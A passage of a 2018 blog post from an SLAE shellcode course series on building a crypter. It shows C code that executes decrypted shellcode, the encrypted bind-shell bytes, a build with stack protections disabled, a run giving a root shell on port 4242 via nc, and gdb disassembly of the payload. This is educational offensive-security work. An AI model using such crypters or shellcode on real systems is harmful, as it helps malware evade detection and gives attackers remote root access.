+</span><span class='line'>  <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="kt">void</span><span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="kt">void</span><span class="p">))</span> <span class="n">b</span><span class="p">)();</span>         <span class="cm">/* Execute decrypted shellcode. */</span>
+</span><span class='line'>  <span class="k">return</span> <span class="p">(</span><span class="mi">0</span><span class="p">);</span>                     <span class="cm">/* NOTREACHED */</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Executing the crypter yields the following output. Like with the previous exercises, the shellcode to execute can be tweaked by the <strong>SHELLCODE</strong> variable:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make crypter <span class="nv">SHELLCODE</span><span class="o">=</span>../0x01-bind/bind
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'><span class="se">\x</span>eb<span class="se">\x</span>97<span class="se">\x</span>33<span class="se">\x</span>b0<span class="se">\x</span>f6<span class="se">\x</span>5a<span class="se">\x</span>73<span class="se">\x</span>32<span class="se">\x</span>31<span class="se">\x</span>34<span class="se">\x</span>c8<span class="se">\x</span>00<span class="se">\x</span>63<span class="se">\x</span>34<span class="se">\x</span>98<span class="se">\x</span>8e<span class="se">\x</span>47<span class="se">\x</span>2d<span class="se">\x</span>dc<span class="se">\x</span>6f<span class="se">\x</span>c4<span class="se">\x</span>1f<span class="se">\x</span>83<span class="se">\x</span>81<span class="se">\x</span>f9<span class="se">\x</span>04<span class="se">\x</span>1b<span class="se">\x</span>c9<span class="se">\x</span>96<span class="se">\x</span>86<span class="se">\x</span>6f<span class="se">\x</span>e2
+</span><span class='line'><span class="se">\x</span>cb<span class="se">\x</span>1a<span class="se">\x</span>5c<span class="se">\x</span>61<span class="se">\x</span>70<span class="se">\x</span>5e<span class="se">\x</span>82<span class="se">\x</span>09<span class="se">\x</span>59<span class="se">\x</span>4f<span class="se">\x</span>e6<span class="se">\x</span>42<span class="se">\x</span>1a<span class="se">\x</span>62<span class="se">\x</span>b9<span class="se">\x</span>a6<span class="se">\x</span>43<span class="se">\x</span>09<span class="se">\x</span>df<span class="se">\x</span>99<span class="se">\x</span>33<span class="se">\x</span>22<span class="se">\x</span>f4<span class="se">\x</span>fa<span class="se">\x</span>41<span class="se">\x</span>a5<span class="se">\x</span>27<span class="se">\x</span>6a<span class="se">\x</span>e7<span class="se">\x</span>fc<span class="se">\x</span>76<span class="se">\x</span>6a<span class="se">\x</span>86<span class="se">\x</span>5e<span class="se">\x</span>a2<span class="se">\x</span>8b<span class="se">\x</span>f3<span class="se">\x</span>3f<span class="se">\x</span>5c<span class="se">\x</span>90<span class="se">\x</span>e9<span class="se">\x</span>eb<span class="se">\x</span>38<span class="se">\x</span>4a<span class="se">\x</span>0f<span class="se">\x</span>30<span class="se">\x</span>db<span class="se">\x</span>20<span class="se">\x</span>4a<span class="se">\x</span>8f<span class="se">\x</span>cd<span class="se">\x</span>8a<span class="se">\x</span>a2<span class="se">\x</span>53<span class="se">\x</span>af<span class="se">\x</span>c4<span class="se">\x</span>03<span class="se">\x</span>1b<span class="se">\x</span>e8<span class="se">\x</span>f5<span class="se">\x</span>9e<span class="se">\x</span>e4<span class="se">\x</span>ed<span class="se">\x</span>a6<span class="se">\x</span>43<span class="se">\x</span>c5<span class="se">\x</span>92<span class="se">\x</span>dd<span class="se">\x</span>b9<span class="se">\x</span>20<span class="se">\x</span>0d<span class="se">\x</span>1a<span class="se">\x</span>b0<span class="se">\x</span>95<span class="se">\x</span>e7<span class="se">\x</span>33<span class="se">\x</span>d0<span class="se">\x</span>44<span class="se">\x</span>1b<span class="se">\x</span>05<span class="se">\x</span>47<span class="se">\x</span>1c<span class="se">\x</span>59<span class="se">\x</span>3f<span class="se">\x</span>99<span class="se">\x</span>e1<span class="se">\x</span>d2<span class="se">\x</span>74<span class="se">\x</span>62<span class="se">\x</span>6d<span class="se">\x</span>2b<span class="se">\x</span>85<span class="se">\x</span>55<span class="se">\x</span>e2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The <strong>decrypter</strong> target already takes care of executing the crypter with the specified shellcode and extracting it from the above output:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make decrypter
+</span><span class='line'>cc -W -Wall -Wformat<span class="o">=</span><span class="m">2</span> -fno-stack-protector -zexecstack -ggdb -DSHELLCODE<span class="o">=</span><span class="sb">`</span>./crypter<span class="p">|</span>tail -n1<span class="sb">`</span>  -c -o decrypter.o decrypter.c
+</span><span class='line'>cc -lcrypto -lcurl -zexecstack  decrypter.o common.o   -o decrypter
+</span><span class='line'><span class="c"># ./decrypter</span>
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'><span class="nv">$ </span>ss -nlt<span class="p">|</span>grep 4242
+</span><span class='line'>LISTEN     <span class="m">0</span>      <span class="m">0</span>                                                         *:4242                                                                  *:*
+</span><span class='line'><span class="nv">$ </span>nc 127.0.0.1 4242
+</span><span class='line'>id
+</span><span class='line'><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Printing the contents of the decrypted buffer shows that the shellcode payload was correctly decrypted and is not gibberish unlike the original provided one:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> b 36
+</span><span class='line'>Breakpoint <span class="m">1</span> at 0xb22: file decrypter.c, line 36.
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> r
+</span><span class='line'>Starting program: /attic/slae/exam/0x07-crypter/decrypter
+</span><span class='line'><span class="o">[</span>Thread debugging using libthread_db enabled<span class="o">]</span>
+</span><span class='line'>Using host libthread_db library <span class="s2">&quot;/lib/i386-linux-gnu/libthread_db.so.1&quot;</span>.
+</span><span class='line'><span class="o">[</span>New Thread 0xb7a9bb40 <span class="o">(</span>LWP 1008<span class="o">)]</span>
+</span><span class='line'><span class="o">[</span>Thread 0xb7a9bb40 <span class="o">(</span>LWP 1008<span class="o">)</span> exited<span class="o">]</span>
+</span><span class='line'>Generating key from: science/2018/aug/21/use-of-killer-robots-in-wars-would-breach-law-say-campaigners
+</span><span class='line'>
+</span><span class='line'>Thread <span class="m">1</span> <span class="s2">&quot;decrypter&quot;</span> hit Breakpoint 1, main <span class="o">()</span> at decrypter.c:36
+</span><span class='line'><span class="m">36</span>              <span class="o">(</span>*<span class="o">(</span>void<span class="o">(</span>*<span class="o">)(</span>void<span class="o">))</span> b<span class="o">)()</span><span class="p">;</span>         /* Execute decrypted shellcode. */
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i b
+</span><span class='line'>   0xbfffd648:  xor    eax,eax
+</span><span class='line'>   0xbfffd64a:  xor    esi,esi
+</span><span class='line'>   0xbfffd64c:  cdq
+</span><span class='line'>   0xbfffd64d:  mov    ax,0x167
+</span><span class='line'>   0xbfffd651:  push   0x2
+</span><span class='line'>   0xbfffd653:  pop    ebx
+</span><span class='line'>   0xbfffd654:  push   0x1
+</span><span class='line'>   0xbfffd656:  pop    ecx
+</span><span class='line'>   0xbfffd657:  int    0x80
+</span><span class='line'>   0xbfffd659:  xchg   ebx,eax
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x/10i ptr
+</span><span class='line'>   0x40308c &lt;shellcode+12&gt;:     sti
+</span><span class='line'>   0x40308d &lt;shellcode+13&gt;:     outs   dx,BYTE PTR ds:<span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>   0x40308e &lt;shellcode+14&gt;:     sar    dh,0xcc
+</span><span class='line'>   0x403091 &lt;shellcode+17&gt;:     and    cl,BYTE PTR <span class="o">[</span>edi+eiz*8+0x36aa830f<span class="o">]</span>
+</span><span class='line'>   0x403098 &lt;shellcode+24&gt;:     outs   dx,BYTE PTR ds:<span class="o">[</span>esi<span class="o">]</span>
+</span><span class='line'>   0x403099 &lt;shellcode+25&gt;:     fmul   QWORD PTR <span class="o">[</span>edx-0x6c<span class="o">]</span>
+</span><span class='line'>   0x40309c &lt;shellcode+28&gt;:     cmp    al,0xb5
+</span><span class='line'>   0x40309e &lt;shellcode+30&gt;:     xchg   BYTE PTR <span class="o">[</span>eax-0x58bfcbc1<span class="o">]</span>,dh
+</span><span class='line'>   0x4030a4 &lt;shellcode+36&gt;:     or     ah,dl
+</span><span class='line'>   0x4030a6 &lt;shellcode+38&gt;:     sub    ecx,esi
+</span></code></pre></td></tr></table></div></figure>
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">tcunha</span></span>
+
+      
+
+
+
+
+<time class='entry-date' datetime='2018-08-21T00:50:25+00:00'><span class='date'><span class='date-month'>Aug</span> <span class='date-day'>21</span><span class='date-suffix'>st</span>, <span class='date-year'>2018</span></span> <span class='time'>12:50 am</span></time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/slae/'>slae</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter/" data-via="" data-counturl="http://tcunha.github.io/blog/2018/08/21/slae-0x07-crypter/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/" title="Previous Post: SLAE 0x06: Polymorphic Shellcodes">&laquo; SLAE 0x06: Polymorphic Shellcodes</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/21/slae-0x07-crypter/">SLAE 0x07: Crypter</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/07/28/slae-0x06-polymorphic-shellcodes/">SLAE 0x06: Polymorphic Shellcodes</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/07/18/slae-0x05-metasploit-payloads/">SLAE 0x05: Metasploit Payloads</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/07/12/slae-0x04-encoder/">SLAE 0x04: Encoder</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/06/19/slae-0x03-egghunter/">SLAE 0x03: Egghunter</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - tcunha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
